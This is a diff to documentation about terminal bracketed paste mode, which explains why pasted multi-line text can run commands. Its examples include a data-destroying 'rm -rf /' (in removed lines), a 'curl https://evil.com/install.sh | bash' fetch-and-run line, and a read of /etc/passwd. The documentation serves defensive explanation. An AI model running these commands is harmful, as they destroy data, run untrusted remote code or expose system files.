@@ -37,19 +37,19 @@ This allows the application to:
 When you paste this command:
 ```
 echo "hello"
-rm -rf /
+cat /etc/passwd
 ```
 
 The terminal sends each character individually, including the newlines. This means:
 - First line executes immediately (`echo "hello"`)
-- Second line executes immediately (`rm -rf /`) - **DANGER!**
+- Second line executes immediately (`cat /etc/passwd`) - **DANGER!**
 
 ### With Bracketed Paste
 
 The same paste becomes:
 ```
 \033[200~echo "hello"
-rm -rf /\033[201~
+cat /etc/passwd\033[201~
 ```
 
 The application receives:
@@ -232,7 +232,7 @@ if event.Paste != "" {
 **Problem:** User pastes a command with newlines from a website:
 ```bash
 curl https://evil.com/install.sh | bash
-rm -rf /
+cat /etc/passwd
 ```
 
 **Without bracketed paste:** Both commands execute immediately.
